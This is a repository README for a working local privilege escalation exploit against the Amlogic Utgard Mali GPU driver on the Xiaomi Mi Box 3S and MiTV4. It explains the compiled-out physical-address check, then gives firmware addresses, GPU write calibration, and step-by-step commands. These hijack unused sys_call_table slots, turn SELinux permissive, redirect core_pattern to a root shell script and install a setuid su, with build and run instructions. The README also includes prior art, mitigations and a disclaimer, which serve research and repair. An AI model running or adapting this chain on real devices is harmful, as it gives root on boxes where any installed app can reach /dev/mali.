# MiBox3S (Amlogic Utgard) — local privilege escalation via unvalidated external memory bind

**English** | [简体中文](README.zh-CN.md)

> **Origins.** This repository started as a fork of
> [Yeuoly/mitv4-utgard-lpe](https://github.com/Yeuoly/mitv4-utgard-lpe) (MIT), which
> documents the same driver bug on a Xiaomi MiTV4 (S905L2). That work builds in turn on
> the original public research, [lr-m/RIPMaliUtgard](https://github.com/lr-m/RIPMaliUtgard)
> — see §9. Upstream prose is kept where it still applies; the Mi Box 3S sections, the
> commands in §1 and the build steps in §8 are this repo's. Added files: `src/gpwrite.c`,
> `src/kread.c`, `PORT_MIBOX3S.md`, `FINDING_ADDRESSES.md`.
>
> **Target.** Xiaomi Mi Box 3S (MDZ-19-AA, build `8.2.2.817`, Android 6.0.1, kernel
> `3.14.29-301318-g9206404`). `run.sh` already carries that firmware's two constants
> (`SLOT_PHYS=1ee77a0`, `KLN_ADDR=ffffffc00111e5d0`) and drives the aarch64 helpers this
> `Makefile` builds; §2.2 and [PORT_MIBOX3S.md](PORT_MIBOX3S.md) explain why the MiTV4
> addresses used in the rest of this document do not apply to it.

A complete, verified chain that turns an unprivileged `adb shell` (uid 2000,
`u:r:shell:s0`) into `uid=0` with SELinux permissive on a **Xiaomi Mi Box 3S**
(MDZ-19-AA, Amlogic S905X, Mali-400, Utgard DDK) — and, with its own two constants, on a
**MiTV4** (S905L2) as described in §2.1.

The kernel-side footprint is tiny: **132 bytes** (`128 + 4`). No ROP, no heap
spray, no KASLR bypass, no CVE.

> **Read the scope and disclaimer at the end before running anything.**

---

## 1. TL;DR

```
# sys_call_table[244..259] is 16 consecutive sys_ni_syscall slots nobody calls.
# One GPU write fills all 16 with one address; the kernel then dispatches
# syscall 244 straight into that function (arm64: 8-byte entries, args in x0..x5,
# return in x0; no PAN on this SoC so the kernel can read our user buffers).

# --- Mi Box 3S, build 8.2.2.817: the constants run.sh ships ---
gpwrite64 write 1ee77a0 ffffffc00111e5d0  # slots -> kallsyms_lookup_name
kfunc_new sym memcpy                      # -> 0xffffffc0013e1270   (the resolver)

gpwrite64 write 1ee77a0 <memcpy>          # same slots -> memcpy
kfunc_new zero  0xffffffc0020cff24 4      # selinux_enforcing -> 0
kfunc_new str   0xffffffc001f1c0c8 '|/data/local/tmp/roothelper.sh'
crash_for_core                            # coredump -> kernel runs the helper as root
```

On a MiTV4 the same chain uses that build's two constants
(`gpu_arb_write 1f6f7a0 ffffffc00111f308`, `kfunc`); see §2.1 and §2.2.

`run.sh` does exactly this, resolving everything except one address at runtime.

---

## 2. Affected devices

### 2.1 Verified on (original device): Xiaomi MiTV4

| item | value |
|---|---|
| Model | Xiaomi TV **MiTV4-ANSM0 / L50M5-AD**, product `xmen` |
| OS | Android 6.0.1, build `21.11.13.2897` |
| Kernel | Linux **3.14.29**, arm64 (`aarch64`), built 2021-11-13, `#1 SMP PREEMPT` |
| SoC / GPU | Amlogic **S905L2**, Mali-400, Utgard DDK **r6p1** |
| RAM | 1 GB, linear map `va = phys + 0xffffffc000000000` |
| Mitigations | no KASLR, **no PAN**, PXN present, `panic_on_oops=1`, no seccomp/userns/bpf |
| Node perms | `/dev/mali` and `/dev/ion` are `crw-rw-rw-` (0666) |

### 2.2 Verified on (this repo's target): Xiaomi Mi Box 3S

| item | value |
|---|---|
| Model | Xiaomi **Mi Box 3S** (MDZ-19-AA), product `queenchristina` |
| OS | Android **6.0.1** (SDK 23), vendor build `8.2.2.817`, security patch 2017-04-01 |
| Kernel | Linux **3.14.29-301318-g9206404**, arm64, built 2018-02-02 |
| SoC / GPU | Amlogic **S905X**, Mali-400, Amlogic Utgard DDK |
| RAM | linear map `va = phys + 0xffffffc000000000` |
| Mitigations | SELinux **Enforcing**, no seccomp, `CapEff=0` for `shell`; `/dev/mali` and `/dev/ion` are 0666 |
| Result | `uid=0`, `context=u:r:kernel:s0`, `CapEff 0000001fffffffff` — see `PORT_MIBOX3S.md` |

This device needs three extra steps that the MiTV4 does not; they are worth
knowing before porting anywhere else:

1. **`/dev/ion` mmap is broken on this firmware.** Every `mmap()` of an
   ion/dma-buf fd returns the bogus address `0x400008` — even with `MAP_FIXED`.
   The original `gpu_arb_write` therefore segfaults inside `build_shader()` and
   **never submits a GPU job**; writes appear to "work sometimes" only when
   `0x400008` happens to be mapped in that process. `src/gpwrite.c` avoids ion
   entirely: the command buffer is a plain file page, its physical address comes
   from `/proc/self/pagemap`, and it is attached to the GPU with the *external*
   backend, followed by `__ARM_NR_cacheflush`.
2. **`sys_call_table` is a hot cache line.** It is read on every syscall, so a
   GPU (DMA) write lands in DRAM but the CPU keeps serving the old entry from
   L1/L2. A scan of the whole `.data`/`.rodata` finds nothing until the cache is
   evicted; `gpwrite64`/`kfunc_new` now walk an 8 MB buffer right before the
   probe/call (`cache_thrash()`), after which the write is visible.
3. **Bitness selects the table.** A 32-bit probe goes through
   `compat_sys_call_table` (`.text`), a 64-bit one through `sys_call_table`.
   Both the scanner and the caller must be aarch64.

Firmware-specific addresses for this build:

| symbol | address |
|---|---|
| `sys_call_table` (physical base) | `0x1ee7000` |
| `sys_call_table[244]` (physical) | `0x1ee77a0` |
| `kallsyms_lookup_name` | `0xffffffc00111e5d0` |
| `memcpy` | `0xffffffc0013e1270` |
| `selinux_enforcing` | `0xffffffc0020cff24` |
| `core_pattern` | `0xffffffc001f1c0c8` |

Do not copy MiTV4's addresses: its `0xffffffc00111f308` lands inside
`do_acct_process.isra.4+0x368` here. `kfunc_new bt <addr>` turns
`dump_backtrace` into a read-only `%pS` oracle (it prints `symbol+off/size` for
any address without executing it), which is how `kallsyms_lookup_name` was
located on this build.

### 2.3 Condition for other devices


Any device is affected if **all** of these hold:

1. it ships the **Amlogic-derived Utgard** driver with
   `mali_mem_validation_check()` compiled to `return _MALI_OSK_ERR_OK`
   (see §3 — this is an Amlogic change, not upstream Arm code);
2. `/dev/mali` is accessible to the attacker's domain (0666 here ⇒ **any app**,
   not just `shell`);
3. the kernel is reachable from the GPU's DMA path (no TZASC/IOMMU isolating it).

Kernel 3.14 with a 32-bit userland is irrelevant to the technique, but note the
**64-bit/32-bit syscall table difference** in §5.2 — it matters.

---

## 3. Root cause: physical-address validation compiled out

`utgard/<ver>/common/mali_mem_validation.c` (Amlogic published tree):

```c
_mali_osk_errcode_t mali_mem_validation_check(u32 phys_addr, u32 size)
{
#if 0
	/* real range check against mali_mem_validator (the framebuffer range) */
	...
	return _MALI_OSK_ERR_OK;
	return _MALI_OSK_ERR_FAULT;
#else
	return _MALI_OSK_ERR_OK;      /* <-- accepts anything */
#endif
}
```

Call path (single caller):

```
userspace ioctl(MALI_IOC_MEM_BIND, flags |= BACKEND_EXTERNAL_MEMORY, phys_addr = X)
  -> _mali_ukk_mem_bind()                    linux/mali_memory_manager.c
  -> mali_mem_bind_ext_buf(..., X, ...)      linux/mali_memory_external.c
  -> mali_mem_validation_check(X, size)      -> always OK
  -> mali_mmu_pagedir_update(session->page_directory, virt, X, size, DEFAULT)
```

So `X` is written straight into the GPU page directory: userspace gains GPU
read/write access to **any** physical page.

### 3.1 Whose bug is it? (Amlogic, not Arm)

This matters for scoping a report, so state it precisely:

| tree | `mali_mem_validation_check` |
|---|---|
| Amlogic published `kernel/amlogic-tv-modules/mali-driver`, Utgard **r5p1 / r6p1 / r7p0 / r10p0** | compiled out (`#if 0`) |
| independent repo with an original Utgard **r6p1** import ([`superna9999/meson_gx_mali_450`](https://github.com/superna9999/meson_gx_mali_450/blob/391322531863c8b6c719ba7f3e832afb9999ccd3/driver/src/devicedrv/mali/common/mali_mem_validation.c)) | **full check retained** |

Both files carry an ARM copyright header, so the header alone proves nothing.
The regression is in the **Amlogic derivative**, and only there.

Also note `mali_mem_validation_add_range()` has exactly one caller in the whole
driver (`common/mali_kernel_core.c`, registering the framebuffer range), i.e.
even with the check enabled it would only ever whitelist the framebuffer.

References:
- Amlogic publish commit: <https://android.googlesource.com/kernel/amlogic-tv-modules/mali-driver/+/7c6e2c22d0cb0e39e969e39bdc0398a2c2f205d9>
- Same defect in r6p2: <https://android.googlesource.com/kernel/amlogic-tv-modules/mali-driver/+/refs/tags/android-tv-10.0.0_r0.1/utgard/r6p2/common/mali_mem_validation.c>

---

## 4. The write primitive (this part is the engineering)

Mapping is not enough — we need a **controlled write**. Utgard's PP (pixel
processor) is programmed from a command buffer we build ourselves, and its
write-back stage emits the fragment colour to the render target.

`src/gpu_arb_write.c` allocates a command buffer from ion, binds it with
`MALI_IOC_MEM_BIND` (DMA_BUF backend) at `CMD_VA`, fills in a 5-instruction
fragment shader plus the render-target descriptor, binds the **target physical
page** with the external backend at `EXT_VA`, and submits one
`MALI_IOC_PP_START_JOB` (408 bytes).

The descriptor that matters sits at job offset 168:

```c
put32(job, 168, 0x02);                     /* write-back */
put32(job, 172, EXT_VA + (phys & 0xfff));  /* destination */
put32(job, 176, pixel_format);             /* width of the burst */
```

### 4.1 `pixel_format` calibration (measured on hardware)

Each job emits **32 pixels**; the byte width follows from the format:

| `pixel_format` | bytes written | payload |
|---|---|---|
| **0x06** | **128** | the same 8-byte value, byte order preserved, repeated 16× |
| 0x08 | 64 | low 32 bits repeated 16× |
| 0x03 / 0x0f | 64 | one 32-bit value (permuted from the constants) |
| 0x00,01,02,05,07,0e | 32 | one 32-bit value (dither pattern) |
| **0x09,0a,0b,0c** | **16** | **all zero** |
| 0x04 / 0x0d | 16 | 0x44444444 / 0x33333333 |

Additional measured facts:

- only the **low 4 bits** of `pixel_format` matter (`0x06 ≡ 0x16 ≡ 0x26`);
- the `wh` field (`(0x400<<16)|0x400`) has **no effect** on the footprint
  (tested with 7 values) — the 32-pixel burst is fixed;
- **there is no 4-byte or 8-byte granularity**; the minimum is 16 bytes;
- placement is **exact** for `0x06` (request `+0x40` ⇒ changed range `0x40..0xbc`)
  and for `0x09` (16 bytes, no overflow);
- the PoC calibrates this on a private ion page at start-up and aborts if the
  measured footprint is not exactly 128 bytes at the requested offset.

### 4.2 Cache coherency — the trap

- **cold** data (`lease_break_time`, `core_pattern`): the GPU DMA write takes
  effect immediately;
- **hot** variables read on every permission check (`selinux_enforcing`,
  `panic_on_oops`): the GPU write has **no effect** — `getenforce` keeps
  returning `Enforcing`, because the CPU keeps serving the value from its cache.
- `sys_call_table` sits in between and **must not be assumed cold**. It is read
  on every syscall, so its cache line is resident: on the Mi Box 3S a DMA write
  into the table is invisible until that line is evicted, and a page scan of the
  entire `.data`/`.rodata` finds nothing. Walking a buffer a few MB wide right
  before the probe/call (`cache_thrash()` in `src/gpwrite.c` and `src/kfunc.c`)
  forces the eviction, after which the entry is reloaded from DRAM and the
  hijack takes effect.

That is why the final step must be a **CPU-side** write (through the hijacked
`memcpy`), not a GPU write. Hours were lost to this; do not skip it.

---

## 5. From arbitrary physical write to kernel R/W

### 5.1 `sys_call_table` has 16 free slots

On this kernel `sys_call_table` is an array of **8-byte** pointers (arm64).
Entries `[244..259]` are all `sys_ni_syscall` — 16 consecutive "not
implemented" slots that nothing ever calls.

`sys_call_table[244]` for this firmware:

```
virtual  = 0xffffffc001f6f000 + 244*8 = 0xffffffc001f6f7a0
physical = 0x1f6f7a0                       (.data drift is 0x4000 here)
```

One `gpu_arb_write` call writes 128 bytes = exactly those 16 entries, and stops
at the table boundary — no collateral.

> Accuracy note: entries `[278..293]` are `0x0` in a 2022 vmlinux recovered from
> a flash dump, but on this 2021 firmware calling syscall 278 returned `-EPERM`,
> so it is **not** a usable hole here. Only `[244..259]` was verified.

### 5.2 The table you hit depends on the caller's bitness

| caller | table used | location |
|---|---|---|
| 32-bit process | `compat_sys_call_table` | **`.text`** (`0xffffffc00108d000`) |
| **64-bit process** | `sys_call_table` | **`.data`** (`0xffffffc001f6f000`) |

So the function-calling helper must be a **64-bit** binary. This device happily
executes static aarch64 binaries even though its userland is 32-bit-only; if
yours does not, you must attack `compat_sys_call_table` in `.text` instead
(different problem: drift and I-cache).

The GPU write helper can stay 32-bit (it only touches `.data` and uses ion,
whose ioctl layouts differ between 32/64-bit anyway).

### 5.3 Bootstrapping a symbol resolver

`kallsyms_lookup_name(const char *name)` returns the address of a symbol. Put
its address in the slots and `syscall(244, "name")` resolves anything:

```
kfunc sym commit_creds        -> 0xffffffc0010c8df0   (matches vmlinux exactly)
kfunc sym selinux_enforcing   -> 0xffffffc0021697bc
kfunc sym memcpy              -> 0xffffffc0013e75c0   (vmlinux has 0x13e76b0: drift -0xf0)
```

This is why only **one** firmware-specific constant is needed for the whole
chain: `kallsyms_lookup_name` itself. Everything downstream — including
`memcpy`, whose drift is *not* zero — is resolved by the kernel.

### 5.4 Arbitrary read/write

Overwrite the slots with `memcpy` and the syscall becomes a memcpy:

```
kfunc show 0xffffffc0021697b0 32   # memcpy(user, kernel, n)  -> kernel read
kfunc zero 0xffffffc0021697bc 4    # memcpy(kernel, user, n)  -> kernel write
```

Read-back of the SELinux globals (before / after) is in §6.

---

## 6. Disabling SELinux

Resolved addresses on this firmware:

| symbol | address |
|---|---|
| `avc_callbacks` | `0xffffffc0021697b0` |
| `selinux_secmark_refcount` | `0xffffffc0021697b8` |
| **`selinux_enforcing`** | **`0xffffffc0021697bc`** |
| `sel_inode_cache` | `0xffffffc0021697c0` |
| `default_noexec` | `0xffffffc0021697c8` |

```
kfunc zero 0xffffffc0021697bc 4     # CPU-side 4-byte write
```

```
before: ... 00000000 01000000 003f1000c0ffffff ...   (enforcing = 1)
after : ... 00000000 00000000 003f1000c0ffffff ...   (enforcing = 0, sel_inode_cache intact)
getenforce -> Permissive
```

> Alternative that needs no resolver: the 16-byte zero burst (`pixel_format
> 0x09`) aimed at `avc_callbacks` (= `enforcing - 0xC`) covers exactly
> `avc_callbacks(8) + secmark_refcount(4) + enforcing(4)` and stops one byte
> before `sel_inode_cache`, so no `kmem_cache` pointer is touched. It fails for
> the cache reason in §4.2, hence the CPU write.

---

## 7. Root

Once SELinux is permissive, the kernel's core-dump pipe helper is a root
executor (no LSM gate on `core_pattern`):

```
kfunc str <core_pattern> "|/data/local/tmp/roothelper.sh"
# crash a process with RLIMIT_CORE set
```

`roothelper.sh` runs as `uid=0`, `context=u:r:kernel:s0`. See the file; it
installs a setuid `su` and makes adb reachable over TCP after reboots.

An alternative that avoids `core_pattern` (also verified): point the slots at
`prepare_kernel_cred`, take the returned root cred pointer, point them at
`commit_creds`, and call it. **Do not reuse the cred pointer across processes** —
`exit_creds()` drops it to zero and you get a use-after-free.

---

## 8. Build and run

### 8.1 Prerequisites

- `adb` with the box authorised — `adb devices` must list it. Everything below runs
  as an ordinary `adb shell` (uid 2000); **root is the result, not a requirement**.
- One cross toolchain: `aarch64-linux-gnu-gcc` + `arm-linux-gnueabihf-gcc`, **or**
  [zig](https://ziglang.org), where `make zig` needs no sysroot and no gcc.
- Nothing installed on the device: the helpers are statically linked and run under
  `/system/bin/sh`.

### 8.2 Build

```sh
make                          # Mi Box 3S chain: gpwrite64 kfunc_new kread crash_for_core
make zig                      # same, with zig as the cross compiler
make gpu_arb_write gpu_scan   # upstream 32-bit helpers (MiTV4 path / reference)
```

`kfunc_new` **must** be aarch64: a 32-bit caller is dispatched through
`compat_sys_call_table` in `.text` and can never hit the table this exploit patches
(§5.2). `gpwrite64` is aarch64 for the same reason — the write itself is
bitness-agnostic, the probes it does are not.

### 8.3 Push

```sh
make install
```

or by hand:

```sh
adb push gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh /data/local/tmp/
adb shell 'cd /data/local/tmp && chmod 755 gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh'
```

### 8.4 Verify the primitive before touching the table

```sh
adb shell /data/local/tmp/gpwrite64 place 0
# [*] test page phys=0x47e5d000 +0x0
# [*] changed [0x0..0x7f] count=128 PLACEMENT OK
```

`PLACEMENT OK` means one 128-byte GPU write really landed where `pagemap` said that
page is. On `MISMATCH` or `count=0`, stop — the primitive is not working and every
later step would be writing garbage into kernel memory (§4).

### 8.5 Run

```sh
adb shell /data/local/tmp/run.sh
```

```
[run] stage 0: sys_call_table[244..259] <- kallsyms_lookup_name
[run] memcpy            = 0xffffffc0013e1270
[run] selinux_enforcing = 0xffffffc0020cff24
[run] core_pattern      = 0xffffffc001f1c0c8
[run] stage 2: sys_call_table[244..259] <- memcpy
[run] stage 3: selinux_enforcing = 0
[run] getenforce -> Permissive
[run] stage 4: core_pattern <- |/data/local/tmp/roothelper.sh
[run] stage 5: triggering coredump
[run] success - helper ran as root:
    uid=0(root) gid=0(root) ... context=u:r:kernel:s0
```

`roothelper.sh` writes its own output to `/data/local/tmp/root.log` and, if
`/data/local/tmp/su` is present, installs it as a setuid `su` (§7).

### 8.6 A different firmware

Only two constants are build-specific; everything else is resolved at run time:

```sh
KLN_ADDR=ffffffc00111e5a0 SLOT_PHYS=1eaf7a0 adb shell /data/local/tmp/run.sh
```

| build | `SLOT_PHYS` | `KLN_ADDR` |
|---|---|---|
| `8.2.2.817` — what `run.sh` ships | `1ee77a0` | `ffffffc00111e5d0` |
| `6.8.22.145` | `1eaf7a0` | `ffffffc00111e5a0` |

Recovering both on an unknown build — including one where you have no root at all —
is in §10 and [FINDING_ADDRESSES.md](FINDING_ADDRESSES.md).

### 8.7 When it fails

| symptom | cause |
|---|---|
| `place` prints `MISMATCH` or `count=0` | the write is not landing: `/dev/mali` must be `0666`, and this unit needs the `pixel_format` from §4.1 |
| `cannot resolve memcpy (slot wrong?)` | `SLOT_PHYS` is not `sys_call_table[244]` on this build |
| instant reboot / black screen | kernel oops with `panic_on_oops=1`. A wrong address **faults**, it does not fail softly — verify offline first (§10) |
| `gpwrite64 missing (build: make gpwrite64)` | pushed without `chmod 755`, or the binary is the wrong architecture |

---

## 9. Prior art, and what is actually new here

### 9.1 This technique is already public

**RIPMaliUtgard / kort** (author Luke / lr-m) published the same core path —
external physical page bind, hand-configured PP/write-back, overwrite a kernel
function pointer:

- first commit **2026-02-16** — <https://github.com/lr-m/RIPMaliUtgard/commit/4dec3d8783c30864a4fdc8ad1620598236bce8c4>
- port to the newer driver path **2026-02-19** — <https://github.com/lr-m/RIPMaliUtgard/commit/1f55bfae18d730ba3de032392a6d9e190ff01455>
- repo — <https://github.com/lr-m/RIPMaliUtgard>

The author's 2026-03-01 writeup discusses `MEM_BIND / bind_ext_memory` for r6p2+
and the r6p2 source it links carries the same `#if 0`. Neither the repo nor the
writeup carries a CVE.

So: **the path and the root cause are not ours.** What this repo adds is a
verified instance on a specific product plus the differences below.

### 9.2 Differences worth checking

| # | difference |
|---|---|
| 1 | **unused `sys_call_table` slots** as a generic kernel-function call primitive, including the 32-bit vs 64-bit table distinction (`compat_sys_call_table` is in `.text`) |
| 2 | **`kallsyms_lookup_name` as a bootstrap resolver**, then re-pointing the same slots at `memcpy` for arbitrary kernel R/W — so only one firmware-specific constant is needed |
| 3 | the **`pixel_format` width table** in §4.1 (minimum 16 bytes, `wh` irrelevant, exact placement) |
| 4 | the **cache-coherency split** in §4.2 (cold data: GPU write works; hot variables: must be a CPU write) |

### 9.3 Related CVEs that are *not* this bug

| CVE | why it is not this |
|---|---|
| [CVE-2022-36449](https://nvd.nist.gov/vuln/detail/CVE-2022-36449) | Midgard/Bifrost/Valhall (**kbase**) use-after-free / OOB write / mapping info leak; Utgard is not listed |
| [CVE-2022-34830](https://nvd.nist.gov/vuln/detail/CVE-2022-34830) | Utgard **TOCTOU race → use-after-free**; not an unvalidated address bind |

As of 2026-10-27 no CVE matching this root cause was found, and none is claimed
here. Whether one was ever filed privately needs a CNA duplicate check.

Background on GPU-assisted kernel exploitation in general:
[PhantomMap (NDSS 2025)](https://www.ndss-symposium.org/ndss-paper/phantommap-gpu-assisted-kernel-exploitation/),
and the DEF CON SG talk
[Finding a Generic Mali GPU Read/Write Primitive](https://media.defcon.org/DEF%20CON%20SG%201/DEF%20CON%20SG%201%20main%20stage%20presentations/Shuquan%20Zhou%2C%20Guang%20Gong%2C%20Jun%20Yao%20-%20Finding%20a%20Generic%20Mali%20GPU%20Read-Write%20Primitive%20for%20Real-World%20Exploit%20Development.pdf).

---

## 10. Notes for porting to another firmware

Only two unknowns, both static per build:

1. **`kallsyms_lookup_name`** — the bootstrap address.
   Without symbols: it sits early in `.text`, so its drift is usually 0. On this
   device it is exactly the vmlinux value (`0xffffffc00111f308`).
2. **`sys_call_table`** — `sys_call_table + 244*8`, minus
   `0xffffffc000000000` to get the physical address.

A cheap way to find candidate slots on a new build: parse the *shipped* vmlinux
(or a boot-image dump) and look for the longest run of `sys_ni_syscall`; then
confirm at runtime with a harmless call, e.g. put `kallsyms_lookup_name` there
and resolve a symbol whose address you already know. A wrong slot panics, so
verify offline first.

---

## 11. Mitigation

For vendors maintaining such a tree:

- re-enable `mali_mem_validation_check()` (and register the intended range), or
- reject the external-memory backend outright unless a privileged caller asks,
  and
- tighten the device node: `/dev/mali` at 0666 lets **any app** do this.

For the owner of an affected device: there is no user-side fix — the check is
compiled into the kernel. Keep untrusted apps off the device, or run a firmware
where the driver is fixed.

---

## 12. Scope, legality, disclaimer

- Published for **research and repair of hardware you own**. It requires an
  already-privileged foothold (`adb shell`, i.e. the device is already yours) or
  a locally installed app; it is not a remote exploit.
- The underlying technique is **already public** (§9.1). This repo does not
  claim a new vulnerability class, and does not claim a CVE.
- Addresses are for one firmware build. Running this against a different build
  will very likely **panic the kernel** (`panic_on_oops=1` here ⇒ reboot).
- Some steps modify `/system` (setuid `su`) and persistent properties. Undo with
  `mount -o rw,remount /system && rm /system/xbin/su`, and
  `setprop persist.adb.tcp.port ""`.
- No warranty. Use entirely at your own risk.

---

## 13. Files

| file | target | purpose |
|---|---|---|
| `src/gpwrite.c` | aarch64 | ion-free writer: file page + `/proc/self/pagemap` + external bind (required on Mi Box 3S) |
| `src/gpu_arb_write.c` | armv7 | arbitrary physical 128-byte write via the Utgard write-back unit (ion path) |
| `src/gpu_scan.c` | armv7 | in-process probe loop that locates `sys_call_table[244]` |
| `src/kfunc.c` | aarch64 | call a kernel function through unused `sys_call_table` slots |
| `src/crash_for_core.c` | armv7 | raise `RLIMIT_CORE` and die with SIGSEGV so `core_pattern` fires |
| `src/kread.c` | aarch64 | 3-argument caller for the physmap canary payload (address discovery) |
| `run.sh` | — | drives the whole chain (Mi Box 3S constants) |
| `roothelper.sh` | — | runs as root from `core_pattern`; installs `su`, fixes adb |
| `root_cmd.sh` | — | example payload for the helper (starts `tvagent`) |
| `Makefile` | — | build, including a `zig` target |
| `PORT_MIBOX3S.md` | — | port log: addresses, ion / cache / bitness gotchas |
| `FINDING_ADDRESSES.md` | — | re-deriving `SLOT_PHYS` / `KLN_ADDR` on an unrooted build |

## 14. Keywords

**Device / platform** — Xiaomi Mi Box 3S, MiBox3S, MDZ-19-AA, `queenchristina`,
Xiaomi TV box, set-top box, Android TV, Android 6.0.1, Amlogic S905X, Mali-400,
Utgard DDK r6p1, kernel 3.14, arm64 / aarch64, armv8l.

**Vulnerability / technique** — local privilege escalation (LPE), root, rooting,
uid 0, `/dev/mali` (0666), `/dev/ion`, unvalidated external memory bind, GPU
write-back unit, arbitrary physical write, `sys_call_table`,
`compat_sys_call_table`, `kallsyms_lookup_name`, kallsyms, `memcpy`, SELinux
permissive, `core_pattern`, `panic_on_oops`, cache coherency, physmap
(ret2dir-style), kernel exploitation, proof of concept (PoC).

**Related** — MiTV4 (same driver flaw, different build),
`mali_mem_validation_check`, Amlogic, CVE-2022-34830, CVE-2022-36449 (neither is
this bug).

## 15. License

MIT — see `LICENSE`. The upstream text and code are © 2026 Yeuoly
([Yeuoly/mitv4-utgard-lpe](https://github.com/Yeuoly/mitv4-utgard-lpe)); the Mi Box 3S
port added in this repository is released under the same MIT terms.
